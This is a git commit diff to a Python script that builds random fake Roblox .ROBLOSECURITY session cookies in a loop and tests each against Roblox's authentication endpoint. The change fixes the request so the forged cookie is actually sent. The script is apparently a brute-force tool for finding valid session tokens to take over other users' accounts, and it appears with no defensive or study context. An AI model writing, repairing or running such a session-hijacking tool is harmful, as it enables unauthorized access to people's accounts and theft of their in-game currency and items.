1f5d71636d731d9e50306e1c279b183708d89494
KMZT <81222923+KMZT@users.noreply.github.com>
2024-09-28 22:39:41 +0600

    Update main.py

--- main.py
+++ main.py
@@ -6,7 +6,7 @@ while True:
   rancookie = ''.join((random.choice(valid_letters) for i in range(1356)))
   finalcookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie
   headers = {
-        'Cookie': '.ROBLOSECURITY=' + cookie
+        'Cookie': '.ROBLOSECURITY=' + finalcookie
     }
   response = requests.get('https://auth.roblox.com/v1/auth/metadata', headers=headers)
   if response.status_code == 200:
